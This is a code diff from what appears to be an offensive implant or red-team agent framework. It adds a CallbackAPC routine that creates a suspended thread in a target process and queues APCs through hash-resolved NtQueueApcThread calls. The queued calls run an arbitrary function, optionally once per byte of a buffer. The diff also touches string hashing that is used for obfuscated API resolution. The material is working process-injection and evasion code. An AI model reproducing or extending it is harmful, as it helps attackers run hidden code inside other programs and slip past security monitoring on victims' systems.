@@ -150,9 +150,8 @@ D_SEC( B ) ULONG Random32(
     return Seed;
 }
 
-template < typename T >
 D_SEC( B ) ULONG HashString(
-    _In_ T      String,
+    _In_ PCHAR  String,
     _In_ SIZE_T Length
 ) {
     ULONG  Hash  = H_MAGIC_KEY;
@@ -237,6 +236,42 @@ D_SEC( B ) PSTR ErrorHandler(
     VkShow( "{ERR} %s failed with error code: %d (%s)\n", InputString, ErrorCode, ErrorMessage );
 
     return p;
+}
+
+D_SEC( B ) BOOL CallbackAPC(
+    _In_     HANDLE ProcessHandle,
+    _In_     PVOID  FunctionPtr,
+    _In_opt_ PVOID  Parameter,
+    _In_opt_ SIZE_T BufferSize
+) {
+    VELKOR_INSTANCE
+
+    HANDLE      ThreadHandle = NULL;
+    NTSTATUS    NtStatus     = STATUS_SUCCESS;
+
+    ULONG ThreadId = 0;
+
+    ThreadHandle = VkThread::Create( 0, FuncPtr.RtlExitUserThread, 0, CREATE_SUSPENDED, &ThreadId, ProcessHandle );
+
+    if ( BufferSize ) {
+        for ( INT i = 0; i < BufferSize; i++ ) {
+            NtStatus = VkCall<NTSTATUS>( XprNtdll, XPR( "NtQueueApcThread" ), ThreadHandle, FunctionPtr, ( Parameter + i ), 1, ( Parameter + i ) );
+        }
+    } else {
+        NtStatus = VkCall<NTSTATUS>( XprNtdll, XPR( "NtQueueApcThread" ), ThreadHandle, FunctionPtr, Parameter, 0, NULL );
+    }
+   
+    if ( NtStatus != STATUS_SUCCESS ) {
+        VkThread::Terminate( ThreadHandle, STATUS_SUCCESS );
+        VkCall<VOID>( XprNtdll, XPR( "NtClose" ), ThreadHandle );
+        return FALSE;
+    } else {
+        VkThread::Resume( ThreadHandle );
+        VkShow( "thread created succefully %d", ThreadId );
+        VkCall<VOID>( XprKernel32, XPR( "WaitForSingleObject" ), ThreadHandle, INFINITE );
+        VkCall<VOID>( XprNtdll, XPR( "NtClose" ), ThreadHandle );
+        return TRUE;
+    }
 }
 
 D_SEC( B ) PWSTR GetEnv(
